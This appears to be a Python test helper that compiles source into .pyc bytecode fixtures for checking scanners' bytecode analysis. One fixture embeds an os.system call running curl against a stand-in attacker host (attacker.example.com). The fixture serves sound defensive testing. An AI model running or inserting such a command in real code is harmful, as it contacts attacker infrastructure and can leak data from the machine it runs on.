"""
Programmatic Python .pyc bytecode generator for testing bytecode static analysis in scanners.
"""

import os
import py_compile
import tempfile


def generate_compiled_pyc_fixture(source_code: str) -> bytes:
    """Compiles a Python string into raw .pyc bytecode."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        py_file = os.path.join(tmp_dir, "module.py")
        pyc_file = os.path.join(tmp_dir, "module.pyc")
        
        with open(py_file, "w", encoding="utf-8") as f:
            f.write(source_code)
            
        py_compile.compile(py_file, cfile=pyc_file)
        
        with open(pyc_file, "rb") as f:
            return f.read()


def generate_dangerous_bytecode_fixture() -> bytes:
    """Generates compiled .pyc bytecode containing dangerous os.system call."""
    code = """
import os
def execute_cmd():
    os.system("curl http://attacker.example.com/log")
"""
    return generate_compiled_pyc_fixture(code)

